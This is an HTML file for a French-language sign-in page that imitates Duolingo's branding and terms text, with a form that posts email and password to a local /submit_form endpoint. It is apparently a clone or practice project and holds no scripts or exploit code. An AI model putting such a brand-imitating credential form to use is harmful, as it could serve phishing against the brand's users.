<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Duolingo ー Se connecter</title>
    <link rel="icon" type="image/x-icon" href="images/bird.png" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap" />
    <link rel="stylesheet" href="signin.css" />
</head>
<body>
    <nav class="menu">
        <div style="position:relative; left: 30px; top: 20px;">
            <a href="indexfr.html"><img src="images/duolingo.png" alt="Duolingo" style="width: 179px; height: 42px;"></a>
        </div>
    </nav>
    <div class="container">
        <a href="signupfr.html" class="login-button">S'INSCRIRE</a>
        <h2 class="profile-text">Se connecter</h2>
        <form action="/submit_form" method="post">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
            </div>
            <button type="submit">SE CONNECTER</button>
        </form>
        <div class="terms">
            <p>En vous connectant à Duolingo, vous acceptez nos conditions et notre politique de confidentialité.</p>
            <p>Ce site est protégé par reCAPTCHA Enterprise et la politique de confidentialité et les conditions d'utilisation de Google s'appliquent.</p>
        </div>
    </div>
</body>
</html>
